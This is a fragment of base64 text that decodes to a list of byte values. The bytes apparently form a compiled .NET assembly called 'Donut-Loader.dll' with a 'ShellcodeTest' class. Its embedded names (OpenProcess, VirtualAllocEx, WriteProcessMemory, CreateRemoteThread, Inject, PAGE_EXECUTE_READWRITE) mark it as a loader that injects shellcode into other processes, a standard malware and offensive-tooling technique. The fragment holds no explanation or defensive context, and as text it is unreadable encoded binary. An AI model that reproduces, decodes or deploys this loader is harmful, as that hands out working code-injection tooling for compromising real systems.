0NiwgMCwgNzUsIDAsIDQ2LCAxLCA0NiwgMCwgOTEsIDAsIDQ2LCAxLCA0NiwgMCwgMTA3LCAwLCA3MiwgMSwgNDYsIDAsIDExNSwgMCwgODEsIDEsIDQ2LCAwLCAxMjMsIDAsIDkwLCAxLCAxNjksIDAsIDE5NywgMCwgMjE0LCAwLCAyMjMsIDQsIDIzNiwgNCwgMCwgMSwgNSwgMCwgMjUyLCAwLCAxLCAwLCA2LCAxLCA3LCAwLCA4LCAxLCAxLCAwLCA2NywgMSwgOSwgMCwgMjQsIDEsIDIsIDAsIDY1LCAxLCAxMSwgMCwgMzksIDEsIDEsIDAsIDY0LCAxLCAxMywgMCwgNTQsIDEsIDEsIDAsIDAsIDEsIDE1LCAwLCA3MywgMSwgMSwgMCwgMCwgMSwgMTksIDAsIDk5LCAxLCAxLCAwLCA0LCAxMjgsIDAsIDAsIDEsIDAsIDAsIDAsIDM5LCAyOCwgMjgsIDgwLCAwLCAwLCAwLCAwLCAwLCAwLCAxNzUsIDQsIDAsIDAsIDQsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDEsIDAsIDQ5LCAwLCAwLCAwLCAwLCAwLCA0LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAxLCAwLCA1OCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgNjAsIDc3LCAxMTEsIDEwMCwgMTE3LCAxMDgsIDEwMSwgNjIsIDAsIDY4LCAxMTEsIDExMCwgMTE3LCAxMTYsIDQ1LCA3NiwgMTExLCA5NywgMTAwLCAxMDEsIDExNCwgNDYsIDEwMCwgMTA4LCAxMDgsIDAsIDgwLCAxMTQsIDExMSwgMTAzLCAxMTQsIDk3LCAxMDksIDAsIDgzLCAxMDQsIDEwMSwgMTA4LCAxMDgsIDk5LCAxMTEsIDEwMCwgMTAxLCA4NCwgMTAxLCAxMTUsIDExNiwgMCwgMTA5LCAxMTUsIDk5LCAxMTEsIDExNCwgMTA4LCAxMDUsIDk4LCAwLCA4MywgMTIxLCAxMTUsIDExNiwgMTAxLCAxMDksIDAsIDc5LCA5OCwgMTA2LCAxMDEsIDk5LCAxMTYsIDAsIDgwLCA4MiwgNzksIDY3LCA2OSwgODMsIDgzLCA5NSwgNjcsIDgyLCA2OSwgNjUsIDg0LCA2OSwgOTUsIDg0LCA3MiwgODIsIDY5LCA2NSwgNjgsIDAsIDgwLCA4MiwgNzksIDY3LCA2OSwgODMsIDgzLCA5NSwgODEsIDg1LCA2OSwgODIsIDg5LCA5NSwgNzMsIDc4LCA3MCwgNzksIDgyLCA3NywgNjUsIDg0LCA3MywgNzksIDc4LCAwLCA4MCwgODIsIDc5LCA2NywgNjksIDgzLCA4MywgOTUsIDg2LCA3NywgOTUsIDc5LCA4MCwgNjksIDgyLCA2NSwgODQsIDczLCA3OSwgNzgsIDAsIDgwLCA4MiwgNzksIDY3LCA2OSwgODMsIDgzLCA5NSwgODYsIDc3LCA5NSwgODcsIDgyLCA3MywgODQsIDY5LCAwLCA4MCwgODIsIDc5LCA2NywgNjksIDgzLCA4MywgOTUsIDg2LCA3NywgOTUsIDgyLCA2OSwgNjUsIDY4LCAwLCA3NywgNjksIDc3LCA5NSwgNjcsIDc5LCA3NywgNzcsIDczLCA4NCwgMCwgNzcsIDY5LCA3NywgOTUsIDgyLCA2OSwgODMsIDY5LCA4MiwgODYsIDY5LCAwLCA4MCwgNjUsIDcxLCA2OSwgOTUsIDgyLCA2OSwgNjUsIDY4LCA4NywgODIsIDczLCA4NCwgNjksIDAsIDgwLCA2NSwgNzEsIDY5LCA5NSwgNjksIDg4LCA2OSwgNjcsIDg1LCA4NCwgNjksIDk1LCA4MiwgNjksIDY1LCA2OCwgODcsIDgyLCA3MywgODQsIDY5LCAwLCAxMjAsIDU0LCA1MiwgMCwgMTIwLCA1NiwgNTQsIDAsIDExMiwgMTA1LCAxMDAsIDAsIDc3LCA5NywgMTA1LCAxMTAsIDAsIDc5LCAxMTIsIDEwMSwgMTEwLCA4MCwgMTE0LCAxMTEsIDk5LCAxMDEsIDExNSwgMTE1LCAwLCA3MSwgMTAxLCAxMTYsIDc3LCAxMTEsIDEwMCwgMTE3LCAxMDgsIDEwMSwgNzIsIDk3LCAxMTAsIDEwMCwgMTA4LCAxMDEsIDAsIDcxLCAxMDEsIDExNiwgODAsIDExNCwgMTExLCA5OSwgNjUsIDEwMCwgMTAwLCAxMTQsIDEwMSwgMTE1LCAxMTUsIDAsIDg2LCAxMDUsIDExNCwgMTE2LCAxMTcsIDk3LCAxMDgsIDY1LCAxMDgsIDEwOCwgMTExLCA5OSwgNjksIDEyMCwgMCwgODcsIDExNCwgMTA1LCAxMTYsIDEwMSwgODAsIDExNCwgMTExLCA5OSwgMTAxLCAxMTUsIDExNSwgNzcsIDEwMSwgMTA5LCAxMTEsIDExNCwgMTIxLCAwLCA2NywgMTE0LCAxMDEsIDk3LCAxMTYsIDEwMSwgODIsIDEwMSwgMTA5LCAxMTEsIDExNiwgMTAxLCA4NCwgMTA0LCAxMTQsIDEwMSwgOTcsIDEwMCwgMCwgNzMsIDExMCwgMTA2LCAxMDEsIDk5LCAxMTYsIDAsIDczLCAxMTUsIDg3LCAxMTEsIDExOSwgNTQsIDUyLCA4MCwgMTE0LCAxMTEsIDk5LCAxMDEsIDExNSwgMTE1LCAwLCA4MywgMTIxLCAxMTUsIDExNiwgMTAxLCAxMDksIDQ2LCA2OCwgMTA1LCA5NywgMTAzLCAxMTAsIDExMSwgMTE1LCAxMTYsIDEwNSwgOTksIDExNSwgMCwgODAsIDExNCwgMTExLCA5OSwgMTAxLCAxMTUsIDExNSwgMCwgNDYsIDk5LCAxMTYsIDExMSwgMTE0LCAwLCA5NywgMTE0LCAxMDMsIDExNSwgMCwgMTAwLCAxMTksIDY4LCAxMDEsIDExNSwgMTA1LCAxMTQsIDEwMSwgMTAwLCA2NSwgOTksIDk5LCAxMDEsIDExNSwgMTE1LCAwLCA5OCwgNzMsIDExMCwgMTA0LCAxMDEsIDExNCwgMTA1LCAxMTYsIDcyLCA5NywgMTEwLCAxMDAsIDEwOCwgMTAxLCAwLCAxMDAsIDExOSwgODAsIDExNCwgMTExLCA5OSwgMTAxLCAxMTUsIDExNSwgNzMsIDEwMCwgMCwgMTA4LCAxMTIsIDc3LCAxMTEsIDEwMCwgMTE3LCAxMDgsIDEwMSwgNzgsIDk3LCAxMDksIDEwMSwgMCwgMTA0LCA3NywgMTExLCAxMDAsIDExNywgMTA4LCAxMDEsIDAsIDExMiwgMTE0LCAxMTEsIDk5LCA3OCwgOTcsIDEwOSwgMTAxLCAwLCAxMDQsIDgwLCAxMTQsIDExMSwgOTksIDEwMSwgMTE1LCAxMTUsIDAsIDEwOCwgMTEyLCA2NSwgMTAwLCAxMDAsIDExNCwgMTAxLCAxMTUsIDExNSwgMCwgMTAwLCAxMTksIDgzLCAxMDUsIDEyMiwgMTAxLCAwLCAxMDIsIDEwOCwgNjUsIDEwOCwgMTA4LCAxMTEsIDk5LCA5NywgMTE2LCAxMDUsIDExMSwgMTEwLCA4NCwgMTIxLCAxMTIsIDEwMSwgMCwgMTAyLCAxMDgsIDgwLCAxMTQsIDExMSwgMTE2LCAxMDEsIDk5LCAxMTYsIDAsIDEwOCwgMTEyLCA2NiwgOTcsIDExNSwgMTAxLCA2NSwgMTAwLCAxMDAsIDExNCwgMTAxLCAxMTUsIDExNSwgMCwgMTA4LCAxMTIsIDY2LCAxMTcsIDEwMiwgMTAyLCAxMDEsIDExNCwgMCwgMTEwLCA4MywgMTA1LCAxMjIsIDEwMSwgMCwgMTA4LCAxMTIsIDc4LCAxMTcsIDEwOSwgOTgsIDEwMSwgMTE0LCA3OSwgMTAyLCA2NiwgMTIxLCAxMTYsIDEwMSwgMTE1LCA4NywgMTE0LCAxMDUsIDExNiwgMTE2LCAxMDEsIDExMCwgMCwgODMsIDEyMSwgMTE1LCAxMTYsIDEwMSwgMTA5LCA0NiwgODIsIDExNywgMTEwLCAxMTYsIDEwNSwgMTA5LCAxMDEsIDQ2LCA3MywgMTEwLCAxMTYsIDEwMSwgMTE0LCAxMTEsIDExMiwgODMsIDEwMSwgMTE0LCAxMTgsIDEwNSwgOTksIDEwMSwgMTE1LCAwLCA3OSwgMTE3LCAxMTYsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCAxMDgsIDExMiwgODQsIDEwNCwgMTE0LCAxMDEsIDk3LCAxMDAsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAxMTUsIDAsIDEwMCwgMTE5LCA4MywgMTE2LCA5NywgOTksIDEwNywgODMsIDEwNSwgMTIyLCAxMDEsIDAsIDEwOCwgMTEyLCA4MywgMTE2LCA5NywgMTE0LCAxMTYsIDY1LCAxMDAsIDEwMCwgMTE0LCAxMDEsIDExNSwgMTE1LCAwLCAxMDgsIDExMiwgODAsIDk3LCAxMTQsIDk3LCAxMDksIDEwMSwgMTE2LCAxMDEsIDExNCwgMCwgMTAwLCAxMTksIDY3LCAxMTQsIDEwMSwgOTcsIDExNiwgMTA1LCAxMTEsIDExMCwgNzAsIDEwOCwgOTcsIDEwMywgMTE1LCAwLCAxMDgsIDExMiwgODQsIDEwNCwgMTE0LCAxMDEsIDk3LCAxMDAsIDczLCAxMDAsIDAsIDExMiwgMTE0LCAxMTEsIDk5LCA4MCwgNzMsIDY4LCAwLCAxMDgsIDExMiwgODMsIDEyMSwgMTE1LCAxMTYsIDEwMSwgMTA5LCA3MywgMTEwLCAxMDIsIDExMSwgMCwgMTEyLCAxMTQsIDExMSwgOTksIDEwMSwgMTE1LCAxMTUsIDAsIDgzLCAxMjEsIDExNSwgMTE2LCAxMDEsIDEwOSwgNDYsIDgyLCAxMTcsIDExMCwgMTE2LCAxMDUsIDEwOSwgMTAxLCA0NiwgODYsIDEwMSwgMTE0LCAxMTUsIDEwNSwgMTExLCAxMTAsIDEwNSwgMTEwLCAxMDMsIDAsIDg0LCA5NywgMTE0LCAxMDMsIDEwMSwgMTE2LCA3MCwgMTE0LCA5NywgMTA5LCAxMDEsIDExOSwgMTExLCAxMTQsIDEwNywgNjUsIDExNiwgMTE2LCAxMTQsIDEwNSwgOTgsIDExNywgMTE2LCAxMDEsIDAsIDgzLCAxMjEsIDExNSwgMTE2LCAxMDEsIDEwOSwgNDYsIDgyLCAxMDEsIDEwMiwgMTA4LCAxMDEsIDk5LCAxMTYsIDEwNSwgMTExLCAxMTAsIDAsIDY1LCAxMTUsIDExNSwgMTAxLCAxMDksIDk4LCAxMDgsIDEyMSwgODQsIDEwNSwgMTE2LCAxMDgsIDEwMSwgNjUsIDExNiwgMTE2LCAxMTQsIDEwNSwgOTgsIDExNywgMTE2LCAxMDEsIDAsIDY1LCAxMTUsIDExNSwgMTAxLCAxMDksIDk4LCAxMDgsIDEyMSwgNjgsIDEwMSwgMTE1LCA5OSwgMTE0LCAxMDUsIDExMiwgMTE2LCAxMDUsIDExMSwgMTEwLCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgNjUsIDExNSwgMTE1LCAxMDEsIDEwOSwgOTgsIDEwOCwgMTIxLCA2NywgMTExLCAxMTAsIDEwMiwgMTA1LCAxMDMsIDExNywgMTE0LCA5NywgMTE2LCAxMDUsIDExMSwgMTEwLCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgNjUsIDExNSwgMTE1LCAxMDEsIDEwOSwgOTgsIDEwOCwgMTIxLCA2NywgMTExLCAxMDksIDExMiwgOTcsIDExMCwgMTIxLCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgNjUsIDExNSwgMTE1LCAxMDEsIDEwOSwgOTgsIDEwOCwgMTIxLCA4MCwgMTE0LCAxMTEsIDEwMCwgMTE3LCA5OSwgMTE2LCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgNjUsIDExNSwgMTE1LCAxMDEsIDEwOSwgOTgsIDEwOCwgMTIxLCA2NywgMTExLCAxMTIsIDEyMSwgMTE0LCAxMDUsIDEwMywgMTA0LCAxMTYsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCA2NSwgMTE1LCAxMTUsIDEwMSwgMTA5LCA5OCwgMTA4LCAxMjEsIDg0LCAxMTQsIDk3LCAxMDAsIDEwMSwgMTA5LCA5NywgMTE0LCAxMDcsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCA2NSwgMTE1LCAxMTUsIDEwMSwgMTA5LCA5OCwgMTA4LCAxMjEsIDY3LCAxMTcsIDEwOCwgMTE2LCAxMTcsIDExNCwgMTAxLCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgNjcsIDExMSwgMTA5LCA4NiwgMTA1LCAxMTUsIDEwNSwgOTgsIDEwOCwgMTAxLCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgNjUsIDExNSwgMTE1LCAxMDEsIDEwOSwgOTgsIDEwOCwgMTIxLCA4NiwgMTAxLCAxMTQsIDExNSwgMTA1LCAxMTEsIDExMCwgNjUsIDExNiwgMTE2LCAxMTQsIDEwNSwgOTgsIDExNywgMTE2LCAxMDEsIDAsIDY4LCAxMDEsIDk4LCAxMTcsIDEwMywgMTAzLCA5NywgOTgsIDEwOCwgMTAxLCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgNjgsIDEwMSwgOTgsIDExNywgMTAzLCAxMDMsIDEwNSwgMTEwLCAxMDMsIDc3LCAxMTEsIDEwMCwgMTAxLCAxMTUsIDAsIDgzLCAxMjEsIDExNSwgMTE2LCAxMDEsIDEwOSwgNDYsIDgyLCAxMTcsIDExMCwgMTE2LCAxMDUsIDEwOSwgMTAxLCA0NiwgNjcsIDExMSwgMTA5LCAxMTIsIDEwNSwgMTA4LCAxMDEsIDExNCwgODMsIDEwMSwgMTE0LCAxMTgsIDEwNSwgOTksIDEwMSwgMTE1LCAwLCA2NywgMTExLCAxMDksIDExMiwgMTA1LCAxMDgsIDk3LCAxMTYsIDEwNSwgMTExLCAxMTAsIDgyLCAxMDEsIDEwOCwgOTcsIDEyMCwgOTcsIDExNiwgMTA1LCAxMTEsIDExMCwgMTE1LCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgODIsIDExNywgMTEwLCAxMTYsIDEwNSwgMTA5LCAxMDEsIDY3LCAxMTEsIDEwOSwgMTEyLCA5NywgMTE2LCAxMDUsIDk4LCAxMDUsIDEwOCwgMTA1LCAxMTYsIDEyMSwgNjUsIDExNiwgMTE2LCAxMTQsIDEwNSwgOTgsIDExNywgMTE2LCAxMDEsIDAsIDY4LCAxMTEsIDExMCwgMTE3LCAxMTYsIDQ1LCA3NiwgMTExLCA5NywgMTAwLCAxMDEsIDExNCwgMCwgNjcsIDExMSwgMTEwLCAxMTgsIDEwMSwgMTE0LCAxMTYsIDAsIDg0LCAxMTEsIDczLCAxMTAsIDExNiwgNTEsIDUwLCAwLCA2OCwgMTA4LCAxMDgsIDczLCAxMDksIDExMiwgMTExLCAxMTQsIDExNiwgNjUsIDExNiwgMTE2LCAxMTQsIDEwNSwgOTgsIDExNywgMTE2LCAxMDEsIDAsIDEwNywgMTAxLCAxMTQsIDExMCwgMTAxLCAxMDgsIDUxLCA1MCwgNDYsIDEwMCwgMTA4LCAxMDgsIDAsIDEwNywgMTAxLCAxMTQsIDExMCwgMTAxLCAxMDgsIDUxLCA1MCwgMCwgNzEsIDEwMSwgMTE2LCA4MCwgMTE0LCAxMTEsIDk5LCAxMDEsIDExNSwgMTE1LCA2NiwgMTIxLCA3MywgMTAwLCAwLCAxMDMsIDEwMSwgMTE2LCA5NSwgNzMsIDEwMCwgMCwgNjcsIDExMSwgMTEwLCAxMTUsIDExMSwgMTA4LCAxMDEsIDAsIDg3LCAxMTQsIDEwNSwgMTE2LCAxMDEsIDc2LCAxMDUsIDExMCwgMTAxLCAwLCA3MCwgMTE0LCAxMTEsIDEwOSwgNjYsIDk3LCAxMTUsIDEwMSwgNTQsIDUyLCA4MywgMTE2LCAxMTQsIDEwNSwgMTEwLCAxMDMsIDAsIDczLCAxMTAsIDExNiwgODAsIDExNiwgMTE0LCAwLCA5MCwgMTAxLCAxMTQsIDExMSwgMCwgMTAzLCAxMDEsIDExNiwgOTUsIDcyLCA5NywgMTEwLCAxMDAsIDEwOCwgMTAxLCAwLCA0NiwgOTksIDk5LCAxMTYsIDExMSwgMTE0LCAwLCA3MSwgMTAxLCAxMTYsIDY3LCAxMTcsIDExNCwgMTE0LCAxMDEsIDExMCwgMTE2LCA4MCwgMTE0LCAxMTEsIDk5LCAxMDEsIDExNSwgMTE1LCAwLCAwLCAwLCAwLCAxLCAwLCAwLCA1MywgMTgwLCAxNTEsIDU4LCAxMDYsIDQ2LCAxMiwgNzQsIDE0OCwgMTMwLCA2LCAxNCwgMTgwLCA0OCwgNjMsIDIzMCwgMCwgOCwgMTgzLCAxMjIsIDkyLCA4NiwgMjUsIDUyLCAyMjQsIDEzNywgMiwgNiwgOCwgNCwgMiwgMCwgMCwgMCwgNCwgMCwgNCwgMCwgMCwgNCwgOCwgMCwgMCwgMCwgNCwgMzIsIDAsIDAsIDAsIDQsIDE2LCAwLCAwLCAwLCAyLCA2LCA5LCA0LCAwLCAxNiwgMCwgMCwgNCwgMCwgMzIsIDAsIDAsIDQsIDQsIDAsIDAsIDAsIDQsIDY0LCAwLCAwLCAwLCAyLCA2LCAxNCwgNSwgMCwgMSwgMSwgMjksIDE0LCA2LCAwLCAzLCAyNCwgOCwgMiwgOCwgNCwgMCwgMSwgMjQsIDE0LCA1LCAwLCAyLCAyNCwgMjQsIDE0LCA4LCAwLCA1LCAyNCwgMjQsIDI0LCA5LCA5LCA5LCAxMCwgMCwgNSwgMiwgMjQsIDI0LCAyOSwgNSwgOSwgMTYsIDI1LCAxMCwgMCwgNywgMjQsIDI0LCAyNCwgOSwgMjQsIDI0LCA5LCAyNCwgNiwgMCwgMywgOCwgMTQsIDE0LCA4LCA2LCAwLCAyLCAyLCAyNCwgMTYsIDIsIDUsIDAsIDEsIDIsIDE4LCA5LCAzLCAzMiwgMCwgMSwgNCwgMzIsIDEsIDEsIDE0LCA0LCAzMiwgMSwgMSwgMiwgNSwgMzIsIDEsIDEsIDE3LCA2NSwgNCwgMzIsIDEsIDEsIDgsIDQsIDAsIDEsIDgsIDE0LCAzLCA3LCAxLCAyLCA1LCAwLCAxLCAxOCwgOSwgOCwgMywgMzIsIDAsIDgsIDQsIDAsIDEsIDEsIDgsIDUsIDAsIDEsIDI5LCA1LCAxNCwgMiwgNiwgMjQsIDEyLCA3LCA4LCAxOCwgOSwgMTQsIDI5LCA1LCAyNCwgMjQsIDI1LCA4LCAyLCAzLCAzMiwgMCwgMjQsIDQsIDcsIDIsIDIsIDIsIDMsIDAsIDAsIDEsIDQsIDAsIDAsIDE4LCA5LCA1NSwgMSwgMCwgMjYsIDQ2LCA3OCwgNjksIDg0LCA3MCwgMTE0LCA5NywgMTA5LCAxMDEsIDExOSwgMTExLCAxMTQsIDEwNywgNDQsIDg2LCAxMDEsIDExNCwgMTE1LCAxMDUsIDExMSwgMTEwLCA2MSwgMTE4LCA1MiwgNDYsIDUzLCAxLCAwLCA4NCwgMTQsIDIwLCA3MCwgMTE0LCA5NywgMTA5LCAxMDEsIDExOSwgMTExLCAxMTQsIDEwNywgNjgsIDEwNSwgMTE1LCAxMTIsIDEwOCwgOTcsIDEyMSwgNzgsIDk3LCAxMDksIDEwMSwgMCwgMTcsIDEsIDAsIDEyLCA2OCwgMTExLCAxMTAsIDExNywgMTE2LCA0NSwgNzYsIDExMSwgOTcsIDEwMCwgMTAxLCAxMTQsIDAsIDAsIDUsIDEsIDAsIDAsIDAsIDAsIDE5LCAxLCAwLCAxNCwgNjcsIDExMSwgMTEyLCAxMjEsIDExNCwgMTA1LCAxMDMsIDEwNCwgMTE2LCAzMiwgNTAsIDQ4LCA0OSwgNTcsIDAsIDAsIDgsIDEsIDAsIDcsIDEsIDAsIDAsIDAsIDAsIDgsIDEsIDAsIDgsIDAsIDAsIDAsIDAsIDAsIDMwLCAxLCAwLCAxLCAwLCA4NCwgMiwgMjIsIDg3LCAxMTQsIDk3LCAxMTIsIDc4LCAxMTEsIDExMCwgNjksIDEyMCwgOTksIDEwMSwgMTEyLCAxMTYsIDEwNSwgMTExLCAxMTAsIDg0LCAxMDQsIDExNCwgMTExLCAxMTksIDExNSwgMSwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgNDEsIDY0LCAxMzksIDkzLCAwLCAwLCAwLCAwLCAyLCAwLCAwLCAwLCAyOCwgMSwgMCwgMCwgNDgsIDQ1LCAwLCAwLCA0OCwgMjksIDAsIDAsIDgyLCA4MywgNjgsIDgzLCA2NiwgMzMsIDIwMywgMjE2LCAxODQsIDQ0LCAxOSwgNzMsIDE3MywgMTI3LCAxMDcsIDIxNywgMTA3LCAyMTIsIDE2NSwgMjM5LCAzLCAwLCAwLCAwLCA5OSwgNTgsIDkyLCA4NSwgMTE1LCAxMDEsIDExNCwgMTE1LCA5MiwgMTEzLCA1MiwgNTYsIDU3LCA1MCwgNTMsIDQ4LCA0OSwgNTYsIDkyLCA2OCwgMTExLCA5OSwgMTE3LCAxMDksIDEwMSwgMTEwLCAxMTYsIDExNSwgOTIsIDgzLCAxMDQsIDk3LCAxMTQsIDExMiwgNjgsIDEwMSwgMTE4LCAxMDEsIDEwOCwgMTExLCAxMTIsIDMyLCA4MCwgMTE0LCAxMTEsIDEwNiwgMTAxLCA5OSwgMTE2LCAxMTUsIDkyLCA2OCwgMTExLCAxMTAsIDExNywgMTE2LCA0NSwgNzYsIDExMSwgOTcsIDEwMCwgMTAxLCAxMTQsIDkyLCA2OCwgMTExLCAxMTAsIDExNywgMTE2LCA0NSwgNzYsIDExMSwgOTcsIDEwMCwgMTAxLCAxMTQsIDkyLCAxMTEsIDk4LCAxMDYsIDkyLCA2OCwgMTAxLCA5OCwgMTE3LCAxMDMsIDkyLCA2OCwgMTExLCAxMTAsIDExNywgMTE2LCA0NSwgNzYsIDExMSwgOTcsIDEwMCwgMTAxLCAxMTQsIDQ2LCAxMTIsIDEwMCwgOTgsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDEsIDAsIDE2LCAwLCAwLCAwLCAyNCwgMCwgMCwgMTI4LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAxLCAwLCAxLCAwLCAwLCAwLCA0OCwgMCwgMCwgMTI4LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAxLCAwLCAwLCAwLCAwLCAwLCA3MiwgMCwgMCwgMCwgODgsIDY0LCAwLCAwLCAyNTIsIDIsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDI1MiwgMiwgNTIsIDAsIDAsIDAsIDg2LCAwLCA4MywgMCwgOTUsIDAsIDg2LCAwLCA2OSwgMCwgODIsIDAsIDgzLCAwLCA3MywgMCwgNzksIDAsIDc4LCAwLCA5NSwgMCwgNzMsIDAsIDc4LCAwLCA3MCwgMCwgNzksIDAsIDAsIDAsIDAsIDAsIDE4OSwgNCwgMjM5LCAyNTQsIDAsIDAsIDEsIDAsIDAsIDAsIDEsIDAsIDI4LCA4MCwgMzksIDI4LCAwLCAwLCAxLCAwLCAyOCwgODAsIDM5LCAyOCwgNjMsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDQsIDAsIDAsIDAsIDIsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDY4LCAwLCAwLCAwLCAxLCAwLCA4NiwgMCwgOTcsIDAsIDExNCwgMCwgNzAsIDAsIDEwNSwgMCwgMTA4LCAwLCAxMDEsIDAsIDczLCAwLCAxMTAsIDAsIDEwMiwgMCwgMTExLCAwLCAwLCAwLCAwLCAwLCAzNiwgMCwgNCwgMCwgMCwgMCwgODQsIDAsIDExNCwgMCwgOTcsIDAsIDExMCwgMCwgMTE1LCAwLCAxMDgsIDAsIDk3LCAwLCAxMTYsIDAsIDEwNSwgMCwgMTExLCAwLCAxMTAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDE3NiwgNCwgOTIsIDIsIDA